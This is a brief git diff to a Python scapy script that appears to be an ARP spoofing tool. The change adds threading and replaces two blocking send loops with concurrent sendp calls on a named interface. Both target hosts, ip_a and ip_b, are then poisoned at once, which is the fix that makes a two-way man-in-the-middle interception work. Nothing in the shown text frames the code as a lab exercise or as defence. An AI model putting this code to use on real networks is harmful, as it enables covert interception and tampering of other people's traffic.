@@ -1,5 +1,6 @@
 from scapy.all import *
 import argparse
+import threading
 
 def get_true_mac(ip):
     return getmacbyip(ip)
@@ -54,8 +55,8 @@ def main():
     p.start()
 
 
-    send(arp_spoof_packet(args.ip_a, args.ip_b), loop=1, inter=1, verbose=False)
-    send(arp_spoof_packet(args.ip_b, args.ip_a), loop=1, inter=1, verbose=False)
+    threading.Thread(target=sendp, args=(arp_spoof_packet(args.ip_a, args.ip_b),), kwargs={'iface': args.iface, 'loop': 1, 'inter': 1, 'verbose': False}).start()
+    threading.Thread(target=sendp, args=(arp_spoof_packet(args.ip_b, args.ip_a),), kwargs={'iface': args.iface, 'loop': 1, 'inter': 1, 'verbose': False}).start()
 
     p.wait_and_stop()
 
